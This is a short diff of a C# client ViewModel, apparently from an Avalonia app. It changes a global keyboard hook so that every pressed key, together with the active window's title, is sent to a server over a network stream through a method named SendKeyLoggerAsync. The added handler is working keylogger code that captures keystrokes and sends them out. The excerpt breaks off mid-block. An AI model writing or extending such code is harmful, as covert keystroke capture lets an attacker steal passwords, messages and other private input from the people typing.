@@ -48,11 +48,6 @@ namespace CLIENT.ViewModels
             {
                 _synth.SpeakAsyncCancelAll();
                 _synth.SpeakAsync($"You pressed {key}");
-                string windowInfo = WindowDetector.GetActiveWindowInfo();
-                if (_client == null || !_client.Connected)
-                {
-                    await SendKeyLoggerAsync($"Key: {key}, {windowInfo}");
-                }
             };
             KeyboardDetector.Start();
 
@@ -78,6 +73,11 @@ namespace CLIENT.ViewModels
                         byte[] sendBuffer = Encoding.UTF8.GetBytes(clientMessage);
                         await _stream.WriteAsync(sendBuffer, 0, sendBuffer.Length);
 
+                        KeyboardDetector.OnKeyPressed += async (key, isUpperCase, isShiftPressed, isCtrlPressed) =>
+                        {
+                            string windowInfo = WindowDetector.GetActiveWindowInfo();
+                            await SendKeyLoggerAsync($"Key: {key}, {windowInfo}");
+                        };
                         await Dispatcher.UIThread.InvokeAsync(() =>
                         {
                       
